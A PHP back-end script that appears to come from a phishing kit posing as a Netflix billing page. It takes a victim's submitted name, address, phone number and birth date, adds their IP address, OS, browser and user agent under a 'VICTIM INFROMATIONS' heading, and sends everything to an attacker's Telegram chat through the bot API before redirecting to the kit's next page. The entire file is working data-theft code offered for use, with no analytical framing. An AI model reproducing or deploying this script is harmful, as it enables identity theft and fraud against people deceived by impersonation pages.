<?php

session_start();
include "../myconfig/telegram.php";
include "../myconfig/settings.php";
$ip = getenv("REMOTE_ADDR");
foreach ($IdTelegram as $chatId) {
    $message = "[=====>  NETFLIX By Alien |  Billing <=====]\n\n";
    $message .= "[ Name 🍆:  " . $_POST["firstName"] . "\n";
    $message .= "[ Last Name 🍆:  " . $_POST["lastName"] . "\n";
    $message .= "[ ADRESS :  " . $_POST["address"] . "\n";
    $message .= "[ ADRESS2 🏆:  " . $_POST["address2"] . "\n";
    $message .= "[ STATE :  " . $_POST["state"] . "\n";
    $message .= "[ CITY 📍 :  " . $_POST["city"] . "\n";
    $message .= "[ ZIP  🏙️:  " . $_POST["zipcode"] . "\n";
    $message .= "[ Phone Number:  " . $_POST["phone"] . "\n";
    $message .= "[ BIRTH 🎂 :  " . $_POST["birthday"] . "\n";
	$message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
    $message .= "[ IP :    " . $ip . "\n";
    $message .= "[ OS :    " . $user_os . "\n";
    $message .= "[ Browser :    " . $user_browser . "\n";
    $message .= "[ UA :    " . $_SERVER["HTTP_USER_AGENT"] . "\n";
    $message .= "[=====>  NETFLIX By Alien |  Billing <=====]\n\n";
    $website = "https://api.telegram.org/bot" . $botToken;
    $params = [
        "chat_id" => $chatId,
        "text" => $message,
    ];
    $ch = curl_init($website . "/sendMessage");
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
echo '<script type = "text/javascript">window.location = "../index3.php";</script>';
}
?>